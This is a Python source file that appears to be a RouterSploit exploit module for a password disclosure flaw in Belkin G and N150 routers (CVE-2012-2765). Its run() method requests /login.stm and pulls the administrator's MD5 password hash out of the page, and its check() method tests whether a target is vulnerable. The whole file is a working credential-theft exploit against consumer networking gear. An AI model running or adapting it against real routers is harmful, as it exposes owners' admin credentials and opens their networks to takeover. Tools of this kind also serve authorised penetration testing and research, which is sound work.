import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin G & N150 Password Disclosure",
        "description": "Module exploits Belkin G and N150 Password MD5 Disclosure vulnerability which allows fetching administration\'s password in md5 format",
        "authors": (
            "Aodrulez <f3arm3d3ar[at]gmail.com>",  # vulnerability discovery
            "Avinash Tangirala",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2765",
            "https://www.exploit-db.com/exploits/17349/",
        ),
        "devices": (
            "Belkin G",
            "Belkin N150",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            print_success("Exploit success")
            data = [('admin', val[0])]
            headers = ("Login", "MD5 Password")
            print_table(headers, *data)

        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
